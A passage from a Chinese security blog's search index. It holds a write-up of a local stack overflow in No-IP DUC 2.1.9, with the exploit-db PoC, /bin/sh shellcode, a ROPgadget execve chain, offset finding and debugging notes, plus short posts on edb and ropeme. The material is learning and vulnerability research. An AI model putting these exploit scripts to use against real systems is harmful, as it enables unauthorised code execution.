class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></div><div class=\"line\"><span class=\"comment\"># execve generated by ROPgadget</span></div><div class=\"line\"></div><div class=\"line\">from struct import <span class=\"keyword\">pack</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Padding goes here</span></div><div class=\"line\">p = <span class=\"string\">''</span></div><div class=\"line\">p += <span class=\"string\">'\\x90'</span>*<span class=\"number\">296</span></div><div class=\"line\"></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7f01e30</span>) <span class=\"comment\"># 0xece30L: pop ecx ; pop eax ;;</span></div><div class=\"line\">p += <span class=\"string\">'/bin'</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08052140</span>) <span class=\"comment\"># @ .data</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e42ece</span>) <span class=\"comment\"># 0x2deceL: mov [eax] ecx ;;</span></div><div class=\"line\"></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7f01e30</span>) <span class=\"comment\"># 0xece30L: pop ecx ; pop eax ;;</span></div><div class=\"line\">p += <span class=\"string\">'//sh'</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08052144</span>) <span class=\"comment\"># @ .data + 4</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e42ece</span>) <span class=\"comment\"># 0x2deceL: mov [eax] ecx ;;</span></div><div class=\"line\"></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e43d2c</span>) <span class=\"comment\"># 0x2ed2cL: xor eax eax ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e16aa2</span>) <span class=\"comment\"># 0x1aa2L: pop edx ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08052148</span>) <span class=\"comment\"># @ .data + 8</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7f19611</span>) <span class=\"comment\"># 0x104611L: mov [edx] eax ; xor eax eax ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e430cb</span>) <span class=\"comment\"># 0x2e0cbL: pop ecx ; pop edx ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08052148</span>) <span class=\"comment\"># @ .data + 8</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08052148</span>) <span class=\"comment\"># @ .data + 8 </span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e2e8ae</span>) <span class=\"comment\"># 0x198aeL: pop ebx ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08052140</span>) <span class=\"comment\"># @ .data</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7f56e56</span>) <span class=\"comment\"># 0x141e56L: add eax 0xb ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7fdfce0</span>) <span class=\"comment\"># 0xce0L: int 0x80 ;;</span></div><div class=\"line\"></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7e96547</span>) <span class=\"comment\"># xor edx edx ; mov eax edx ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7eedfc2</span>) <span class=\"comment\"># mov ebx edx ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7fdfd76</span>) <span class=\"comment\"># 0xd76L: add al 0x1 ;;</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0xb7fdfce0</span>) <span class=\"comment\"># 0xce0L: int 0x80 ;;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">print</span> p</div></pre></td></tr></table></figure></p>\n<h1 id=\"IV、以-ROP-exploit-运行-noip\"><a href=\"#IV、以-ROP-exploit-运行-noip\" class=\"headerlink\" title=\"IV、以 ROP exploit 运行 noip\"></a>IV、以 ROP exploit 运行 noip</h1><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./NO-IP/noip<span class=\"number\">-2.1</span><span class=\"number\">.9</span><span class=\"number\">-1</span>/binaries/noip2-i686 -i <span class=\"string\">\"`./NO-IP/ropExp.py`\"</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2ey6al4fbj30kd05habx.jpg\" alt=\"\"></p>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"https://www.exploit-db.com/exploits/25411/\" target=\"_blank\" rel=\"external\">No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow</a></p>\n"},{"title":"No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析","url":"http://huirong.github.io/2016/03/28/NoIP-StackOverflow/","content":"<p>溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。<a href=\"https://www.exploit-db.com/exploits/25411/\" target=\"_blank\" rel=\"external\">exploit db POC</a><br><a id=\"more\"></a></p>\n<h1 id=\"I、实验环境\"><a href=\"#I、实验环境\" class=\"headerlink\" title=\"I、实验环境\"></a>I、实验环境</h1><ul>\n<li>操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2</li>\n<li>调试工具：edb-debugger</li>\n<li>应用程序：<a href=\"https://www.exploit-db.com/apps/3b0f5f2ff8637c73ab337be403252a60-noip-duc-linux.tar.gz\" target=\"_blank\" rel=\"external\">No-IP</a></li>\n<li>安装教程：<a href=\"http://www.noip.com/support/knowledgebase/installing-the-linux-dynamic-update-client-on-ubuntu/\" target=\"_blank\" rel=\"external\">请参考</a><br><font color=\"red\">Tips：</font> 在安装过程中，需要输入 no ip 账号密码，安装之前，请先前往<a href=\"https://www.noip.com/\" target=\"_blank\" rel=\"external\">官网</a>注册。</li>\n</ul>\n<h1 id=\"II、POC\"><a href=\"#II、POC\" class=\"headerlink\" title=\"II、POC\"></a>II、POC</h1><h2 id=\"①-原POC\"><a href=\"#①-原POC\" class=\"headerlink\" title=\"① 原POC\"></a>① 原POC</h2><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python</div><div class=\"line\"></div><div class=\"line\">import os</div><div class=\"line\"></div><div class=\"line\">binary = \"./noip-2.1.9-1/binaries/noip2-i686\"</div><div class=\"line\"></div><div class=\"line\">shellcode = \"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>1f<span class=\"symbol\">\\x</span>5e<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>76<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>c0<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>07<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>0c<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>0b\"\\</div><div class=\"line\">            \"<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>0c<span class=\"symbol\">\\x</span>cd<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>db<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>d8<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>cd\"\\</div><div class=\"line\">            \"<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>dc<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff/bin/sh\"</div><div class=\"line\"></div><div class=\"line\">nop = \"<span class=\"symbol\">\\x</span>90\"</div><div class=\"line\">nop_slide = 296 - len(shellcode)</div><div class=\"line\"></div><div class=\"line\"># (gdb) print &amp;IPaddress</div><div class=\"line\"># $2 = (&lt;data variable, no debug info&gt; *) 0x80573bc</div><div class=\"line\">eip_addr = \"<span class=\"symbol\">\\x</span>bc<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>05<span class=\"symbol\">\\x</span>08\"</div><div class=\"line\"></div><div class=\"line\">print \"[*] Executing <span class=\"variable\">%s ...\" %</span> (binary)</div><div class=\"line\"></div><div class=\"line\">os.system(\"<span class=\"variable\">%s -i %</span>s<span class=\"variable\">%s%</span>s\" <span class=\"variable\">% (binary, nop*nop_slide, shellcode, eip_addr))</span></div></pre></td></tr></table></figure>\n<h2 id=\"②-POC-分析\"><a href=\"#②-POC-分析\" class=\"headerlink\" title=\"② POC 分析\"></a>② POC 分析</h2><ul>\n<li>os.system(“%s -i %s%s%s” % (binary, nop*nop_slide, shellcode, eip_addr))<br> 执行命令 ./noip-2.1.9-1/binaries/noip2-i686 -i agrs</li>\n<li>参数：nop<em>nop_slide + shellcode + eip_addr<br> 即 “\\x90”</em>251 + shellcode + eip_addr</li>\n</ul>\n<h2 id=\"③运行-POC\"><a href=\"#③运行-POC\" class=\"headerlink\" title=\"③运行 POC\"></a>③运行 POC</h2><p>在 kali 下直接运行 POC：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg\" alt=\"\"><br>说明 shellcode 成功执行。</p>\n<h1 id=\"III、调试程序\"><a href=\"#III、调试程序\" class=\"headerlink\" title=\"III、调试程序\"></a>III、调试程序</h1><h2 id=\"①-计算返回地址偏移\"><a href=\"#①-计算返回地址偏移\" class=\"headerlink\" title=\"① 计算返回地址偏移\"></a>① 计算返回地址偏移</h2><p>推荐使用 pattern.py 脚本进行计算。<br><strong>1、构造唯一字符串</strong><br>命令：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./pattern<span class=\"selector-class\">.py</span> <span class=\"number\">350</span></div></pre></td></tr></table></figure></p>\n<p>构造长度为 350 的字符串<br><strong>2、使用此参数运行程序</strong><br>命令：<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">edb --run ./NO-IP/noip<span class=\"number\">-2.1</span><span class=\"number\">.9</span><span class=\"number\">-1</span>/binaries/noip2-i686 -i <span class=\"string\">\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al\"</span></div></pre></td></tr></table></figure></p>\n<p>结果：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg\" alt=\"\"><br><strong>3、计算偏移</strong><br>命令：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pattern<span class=\"selector-class\">.py</span> <span class=\"number\">0</span>x396a4138</div></pre></td></tr></table></figure></p>\n<p>结果<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg\" alt=\"\"></p>\n<p>则shellcode可构造为：nops + shellcode + ip_addr，其中 nops + shellcode 长度为 296。</p>\n<h2 id=\"②-构造-exploit\"><a href=\"#②-构造-exploit\" class=\"headerlink\" title=\"② 构造 exploit\"></a>② 构造 exploit</h2><h3 id=\"1、初始-exploit\"><a href=\"#1、初始-exploit\" class=\"headerlink\" title=\"1、初始 exploit\"></a>1、初始 exploit</h3><p>根据上述分析，构造如下 exploit<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python2</div><div class=\"line\"></div><div class=\"line\">p = ''</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>90\" * 251</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>1f<span class=\"symbol\">\\x</span>5e<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>76<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>c0<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>07<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>0c<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>0b\"</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>0c<span class=\"symbol\">\\x</span>cd<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>db<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>d8<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>cd\"</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>dc<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff/bin/sh\"</div><div class=\"line\"></div><div class=\"line\">p += \"aaaa\"</div><div class=\"line\"></div><div class=\"line\">print p</div></pre></td></tr></table></figure></p>\n<h3 id=\"2、调试程序，定位出错点\"><a href=\"#2、调试程序，定位出错点\" class=\"headerlink\" title=\"2、调试程序，定位出错点\"></a>2、调试程序，定位出错点</h3><p><strong>（1）、edb 命令：</strong><br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">edb --run ./NO-IP/noip<span class=\"number\">-2.1</span><span class=\"number\">.9</span><span class=\"number\">-1</span>/binaries/noip2-i686 -i <span class=\"string\">\"`./NO-IP/exploit.py`\"</span></div></pre></td></tr></table></figure></p>\n<p><strong>（2）、定位</strong></p>\n<ul>\n<li>F10 运行程序</li>\n<li>F8 一路单步执行程序，直到溢出<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg\" alt=\"\"></li>\n</ul>\n<p>说明，在 0x08049aef 处 call 0x0804bfec 出错</p>\n<p><strong>（3）、继续定位</strong><br>再次使用 edb 命令调试，并在 0x80049aef 处下断点，进入函数内部执行。</p>\n<ul>\n<li>在 0x08049aef 处下断点</li>\n<li>F10 运行程序</li>\n<li>再次 F10 运行到断点处</li>\n<li>F7 进入函数内部</li>\n<li>F8 一路单步执行，直到函数返回前<br> <img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg\" alt=\"\"></li>\n</ul>\n<p><strong>（4）、首次试验</strong><br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg\" alt=\"\"><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg\" alt=\"\"></p>\n<p>才发现，这个程序的栈、堆都是可执行的，简直不能忍！！！！！</p>\n<p>ip_addr 换成 shellcode 起始地址 0xbffff34f。<br>nops(251) + payload + 0xbffff34f<br>可是发现执行出断错。因为执行shellcode之后，程序继续没有正常退出，继续执行，会报错。</p>\n<h3 id=\"3、查看堆\"><a href=\"#3、查看堆\" class=\"headerlink\" title=\"3、查看堆\"></a>3、查看堆</h3><p>既然栈和堆都是可执行的，payload 在栈中，执行不成功，查看堆。<br>原始 POC 中的 ip_addr = 0x080573bc也在堆中，查看此地址附近的堆内容。</p>\n<p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg\" alt=\"\"></p>\n<p>ip_addr = 0x080573bc 正好是 shellcode 在堆中的起始地址。</p>\n<p>OK，shellcode 构造好了。<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">#!/usr/bin/env python2</div><div class=\"line\"></div><div class=\"line\">p = ''</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>90\" * 251</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>1f<span class=\"symbol\">\\x</span>5e<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>76<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>c0<span class=\"symbol\">\\x</span>88<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>07<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>46<span class=\"symbol\">\\x</span>0c<span class=\"symbol\">\\x</span>b0<span class=\"symbol\">\\x</span>0b\"</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>4e<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>8d<span class=\"symbol\">\\x</span>56<span class=\"symbol\">\\x</span>0c<span class=\"symbol\">\\x</span>cd<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>db<span class=\"symbol\">\\x</span>89<span class=\"symbol\">\\x</span>d8<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>cd\"</div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>80<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>dc<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff<span class=\"symbol\">\\x</span>ff/bin/sh\"</div><div class=\"line\"></div><div class=\"line\">p += \"<span class=\"symbol\">\\x</span>bc<span class=\"symbol\">\\x</span>73<span class=\"symbol\">\\x</span>05<span class=\"symbol\">\\x</span>08\"</div><div class=\"line\"></div><div class=\"line\">print p</div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg\" alt=\"\"></p>\n<p>分析到此处，对于了解缓冲区溢出的人，都能理解 exploit db 中 POC 的构成了。<br>以下是分析漏洞成因。</p>\n<h1 id=\"IV、漏洞成因\"><a href=\"#IV、漏洞成因\" class=\"headerlink\" title=\"IV、漏洞成因\"></a>IV、漏洞成因</h1><p>堆和栈中都有 shellcode<br>shellcode 在堆中的起始地址：0x080573bc<br>在栈中的起始地址：0xbffff5bc</p>\n<p>在调试程序过程中，一直观察 0x080573bc 和 0xbffff5bc 的变化</p>\n<h2 id=\"①-堆的变化\"><a href=\"#①-堆的变化\" class=\"headerlink\" title=\"① 堆的变化\"></a>① 堆的变化</h2><p>在 0x08049898 处 call 0x08049b65，将 shellcode 拷贝到堆中</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg\" alt=\"\"></p>\n<p>call 0x08049b65 之前的 mov 指令是设置参数<br>ebp + 12（0xbffff43c，参数起始地址的地址） 的值存放到 esp + 4<br>ebp + 8 （参数个数）的值存放到 esp </p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg\" alt=\"\"></p>\n<p>栈中查看 0xbffff43c 的值为 0xbffff58d<br>内存中查看 0xbffff58d 处，命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i “<code>./NO-IP/exploit.py</code>“ 的起始地址处。</p>\n<p>因此，此代码段的作用是，将命令拷贝到堆 0x080573bc 处。</p>\n<h2 id=\"②-栈的变化\"><a href=\"#②-栈的变化\" class=\"headerlink\" title=\"② 栈的变化\"></a>② 栈的变化</h2><p>在 0x0804c050 处 call 0x08049348，将堆中的 shellcode 拷贝到栈中。</p>\n<p>call 执行之前<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg\" alt=\"\"></p>\n<p>call 执行之后<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg\" alt=\"\"></p>\n<p>call 0x08049348 有三个参数，分别存放于 esp,exp+4,esp+8<br>将 exp+4(&amp;ip=%s) 和 esp+8(堆中shellcode的起始地址)  拷贝到栈 0xbffff250 处。</p>\n<h2 id=\"③-漏洞成因\"><a href=\"#③-漏洞成因\" class=\"headerlink\" title=\"③ 漏洞成因\"></a>③ 漏洞成因</h2><ul>\n<li>输入命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i “<code>./NO-IP/exploit.py</code>“,没有对参数进行边界检查</li>\n<li>先将整个命令拷贝至堆中</li>\n<li>然后在call 0x08049aef 时，将堆中的命令拷贝至栈中，参数溢出，淹没返回地址。</li>\n</ul>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"https://www.exploit-db.com/exploits/25411/\" target=\"_blank\" rel=\"external\">No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow</a></p>\n"},{"title":"edb 调试带参数的应用程序","url":"http://huirong.github.io/2016/03/24/run-edb-with-args/","content":"<p>edg debugger 是Linux下图形化的调试器，和 ollydbg 一样强大。<br><a id=\"more\"></a></p>\n<h2 id=\"安装及使用方法\"><a href=\"#安装及使用方法\" class=\"headerlink\" title=\"安装及使用方法\"></a>安装及使用方法</h2><p>我使用的 kali 系统，集成了 edb debugger，安装教程请参考 <a href=\"http://blog.csdn.net/ustczwc/article/details/8736271\" target=\"_blank\" rel=\"external\">Linxu edb安装</a></p>\n<p>图形化的界面，使用方法基本是傻瓜式的。<br>但是调试带参数的运行程序，特别是参数是脚本的运行结果，需在命令行设置</p>\n<h2 id=\"带参数运行\"><a href=\"#带参数运行\" class=\"headerlink\" title=\"带参数运行\"></a>带参数运行</h2><p>假设 gdb 的命令为：<br><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./uppercaser &gt; <span class=\"keyword\">in</span><span class=\"selector-class\">.txt</span> &lt; out.txt</div></pre></td></tr></table></figure></p>\n<p>则使用命令启动 edb<br><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">edb --<span class=\"keyword\">run</span> ./uppercaser &gt; <span class=\"keyword\">in</span>.txt &lt; <span class=\"keyword\">out</span>.txt</div></pre></td></tr></table></figure></p>\n<p>如果参数是脚本运行结果<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">edb --<span class=\"built_in\">run</span> ./uppercaser  <span class=\"string\">\"`./exploit.py`\"</span></div></pre></td></tr></table></figure></p>\n<h1 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h1><p><a href=\"http://stackoverflow.com/questions/27911456/edb-how-do-i-debug-a-program-with-i-o-redirection-as-the-arguments\" target=\"_blank\" rel=\"external\">EDB - How do I debug a program with i/o redirection as the arguments?</a></p>\n"},{"title":"快速修复 ropeme ImportError：No module named distorm","url":"http://huirong.github.io/2016/03/11/quick-fix-on-ropeme-importError/","content":"<p>首次使用 <a href=\"https://github.com/packz/ropeme\" target=\"_blank\" rel=\"external\">ropeme</a> 过程中，遇到 ImportError 问题，解决方案如下。<br><a id=\"more\"></a></p>\n<h1 id=\"Ⅰ、问题\"><a href=\"#Ⅰ、问题\" class=\"headerlink\" title=\"Ⅰ、问题\"></a>Ⅰ、问题</h1><p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f36pui72zij30kd03o762.jpg\" alt=\"\"><br><figure class=\"highlight ruby\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">star@ubuntu<span class=\"symbol\">:~/glibc/CVE-</span><span class=\"number\">2015</span>-<span class=\"number\">7547</span>-master$ ../ropeme-master/ropeme/ropshell.py </div><div class=\"line\">Traceback (most recent call last):</div><div class=\"line\">  File <span class=\"string\">\"../ropeme-master/ropeme/ropshell.py\"</span>, line <span class=\"number\">24</span>, <span class=\"keyword\">in</span> &lt;<span class=\"class\"><span class=\"keyword\">module</span>&gt;</span></div><div class=\"line\">    import gadgets</div><div class=\"line\">  File <span class=\"string\">\"/home/star/glibc/ropeme-master/ropeme/gadgets.py\"</span>, line <span class=\"number\">21</span>, <span class=\"keyword\">in</span> &lt;<span class=\"class\"><span class=\"keyword\">module</span>&gt;</span></div><div class=\"line\">    import distorm</div><div class=\"line\"><span class=\"symbol\">ImportError:</span> No <span class=\"class\"><span class=\"keyword\">module</span> <span class=\"title\">named</span> <span class=\"title\">distorm</span></span></div></pre></td></tr></table></figure></p>\n<h1 id=\"Ⅱ、解决方法\"><a href=\"#Ⅱ、解决方法\" class=\"headerlink\" title=\"Ⅱ、解决方法\"></a>Ⅱ、解决方法</h1><ul>\n<li>打开 gadgets.py</li>\n<li>将所有的 distorm 替换成 distorm3</li>\n<li>保存并退出</li>\n<li>然后重新运行 ropshell.py</li>\n</ul>\n<p><font color=\"red\">Tips：</font> 前提是 Linux 中已经安装了 distorm3<br>安装 distorm3<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python</span>-distorm3</div></pre></td></tr></table></figure></p>\n<h1 id=\"Ⅲ、参考文献\"><a href=\"#Ⅲ、参考文献\" class=\"headerlink\" title=\"Ⅲ、参考文献\"></a>Ⅲ、参考文献</h1><p><a href=\"http://breaktoprotect.blogspot.hk/2014/03/quick-fix-on-ropemes-importerror-no.html\" target=\"_blank\" rel=\"external\">Quick fix on ROPeme’s ImportError: No module named 